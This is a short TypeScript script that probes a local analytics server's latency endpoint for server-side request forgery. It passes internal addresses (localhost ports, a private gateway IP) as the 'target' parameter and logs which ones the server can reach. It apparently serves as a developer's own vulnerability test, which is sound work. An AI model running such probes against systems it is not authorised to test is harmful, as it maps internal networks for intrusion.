
import axios from 'axios';

// The Analytics Server URL (Assumed running locally on 3000 or 3001)
const ANALYTICS_URL = 'http://localhost:3000/api/measure-latency';

// List of internal targets to probe via the "target" parameter
const TARGETS = [
    'http://localhost:6000/rpc',       // Default pod port on same machine
    'http://127.0.0.1:6000/rpc',       // Default pod port (IPv4)
    'http://localhost:3000/api/health', // Self-check
    'http://192.168.1.1:80',           // Common Gateway
    'http://google.com',               // External check (control)
];

async function testSSRF() {
    console.log(`Testing SSRF Vulnerability on ${ANALYTICS_URL}...\n`);

    for (const target of TARGETS) {
        try {
            console.log(`[PROBE] Target: ${target}`);
            const response = await axios.get(ANALYTICS_URL, {
                params: { target: target },
                timeout: 5000
            });

            const data = response.data;
            if (data.latency !== null) {
                console.log(`   [SUCCESS] Hit! Latency: ${data.latency}ms`);
                console.log(`   [CONFIRMED] Server can reach ${target}`);
            } else {
                console.log(`   [MISS] Target reachable but no valid latency? (Result: null)`);
            }

        } catch (error: any) {
            console.log(`   [FAIL] Request failed: ${error.message}`);
            if (error.response) {
                console.log(`   [STATUS] ${error.response.status}`);
            }
        }
        await new Promise(r => setTimeout(r, 500)); // be nice
    }
}

testSSRF();
